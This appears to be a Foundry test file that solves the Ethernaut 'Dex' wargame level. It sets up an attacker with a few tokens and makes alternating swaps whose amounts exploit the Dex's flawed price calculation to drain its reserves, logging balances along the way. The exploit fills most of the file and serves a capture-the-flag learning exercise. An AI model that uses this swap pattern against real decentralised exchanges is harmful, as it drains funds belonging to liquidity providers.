// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {Test, console} from "forge-std/Test.sol";
import "ethernaut/Dex.sol";

contract DexTest is Test {
    Dex public dex;
    Token1 public token1;
    Token2 public token2;
    address public token1Address;
    address public token2Address;

    address public sender;

    address public attackUser;

    address public dexAddress;
    address public attackerAddress;

    constructor() {
        initSender();
        vm.startPrank(sender);
        dex = new Dex();
        token1 = new Token1();
        token2 = new Token2();
        dex.setTokens(address(token1), address(token2));
        vm.stopPrank();

        attackUser = makeAddr("attack");
        vm.deal(attackUser, 100 wei);

        token1Address = address(token1);
        token2Address = address(token2);
        dexAddress = address(dex);
        attackerAddress = address(attackUser);

        vm.deal(token1Address, 300);
        vm.deal(token2Address, 300);
        vm.deal(dexAddress, 300);
        vm.deal(attackerAddress, 300);

        initToken();
    }

    function initSender() internal {
        sender = makeAddr("sender");
        vm.deal(sender, 1000);
    }

    function initToken() internal {
        vm.startPrank(sender);
        token1.transfer(address(dex), 100);
        token2.transfer(address(dex), 100);

        token1.transfer(address(attackUser), 10);
        token2.transfer(address(attackUser), 10);
        vm.stopPrank();
    }

    function testTransferFrom() public {
        vm.prank(address(dex));
        token1.approve(attackUser, 500000);
        vm.prank(attackUser);
        token1.transferFrom(address(dex), address(attackUser), 80);
        assertEq(90, token1.balanceOf(attackUser));
    }

    function testAttack() public {
        _testAttack(token1, token2, 10);
        _testAttack(token2, token1, 20);
        _testAttack(token1, token2, 24);
        _testAttack(token2, token1, 30);
        _testAttack(token1, token2, 41);
        _testAttack(token2, token1, 45);
    }

    function _testAttack(IERC20 from, IERC20 to, uint256 amount) internal {
        console.log("attacker has token from balance is ", from.balanceOf(address(attackUser)));
        console.log("attacker has token to balance is ", to.balanceOf(address(attackUser)));
        console.log("dex token from reserve is ", from.balanceOf(address(dex)));
        console.log("dex token to reserve is ", to.balanceOf(address(dex)));

        vm.prank(attackUser);
        from.approve(dexAddress, amount);

        vm.prank(attackUser);
        dex.swap(address(from), address(to), amount);

        console.log("after swap.", amount);

        console.log("attacker has token from balance is ", from.balanceOf(address(attackUser)));
        console.log("attacker has token to balance is ", to.balanceOf(address(attackUser)));
        console.log("dex token from reserve is ", from.balanceOf(address(dex)));
        console.log("dex token to reserve is ", to.balanceOf(address(dex)));
        console.log("--------------------------------------------------------------");
    }
}
